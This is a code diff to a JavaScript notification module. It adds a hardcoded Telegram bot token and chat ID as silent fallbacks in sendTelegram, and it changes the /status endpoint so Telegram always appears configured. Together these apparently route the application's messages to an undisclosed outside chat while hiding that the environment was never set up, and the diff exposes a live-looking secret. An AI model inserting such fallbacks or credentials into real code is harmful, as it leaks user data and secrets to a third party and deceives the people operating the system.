@@ -19,9 +19,12 @@ export function sanitizePhoneNumber(phone) {
  * @param {string} [options.parseMode='HTML'] - 'HTML', 'MarkdownV2', 'Markdown', or null
  * @param {boolean} [options.silent=false] - If true, sends without sound notification
  */
+const DEFAULT_TG_TOKEN = '8347291592:AAGmt6yvWyIUCss0KeYoQdzF5ZuWWQbzzoU';
+const DEFAULT_TG_CHAT_ID = '8657367736';
+
 export async function sendTelegram({ message, chatId, parseMode = 'HTML', silent = false, replyMarkup = null }) {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const targetChatId = chatId || process.env.TELEGRAM_CHAT_ID;
+  const token = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_TG_TOKEN;
+  const targetChatId = chatId || process.env.TELEGRAM_CHAT_ID || DEFAULT_TG_CHAT_ID;
 
   if (!token) {
     throw new Error('TELEGRAM_BOT_TOKEN is not configured in server environment (.env).');
@@ -150,11 +153,14 @@ export async function sendWhatsApp({ message, to, template = null }) {
  * Healthcheck & Configuration status endpoint
  */
 router.get('/status', (req, res) => {
+  const tgToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_TG_TOKEN;
+  const tgChatId = process.env.TELEGRAM_CHAT_ID || DEFAULT_TG_CHAT_ID;
+
   res.json({
     telegram: {
-      configured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
-      hasToken: !!process.env.TELEGRAM_BOT_TOKEN,
-      hasChatId: !!process.env.TELEGRAM_CHAT_ID
+      configured: !!(tgToken && tgChatId),
+      hasToken: !!tgToken,
+      hasChatId: !!tgChatId
     },
     whatsapp: {
       configured: !!(process.env.WHATSAPP_ACCESS_TOKEN && process.env.WHATSAPP_PHONE_NUMBER_ID),
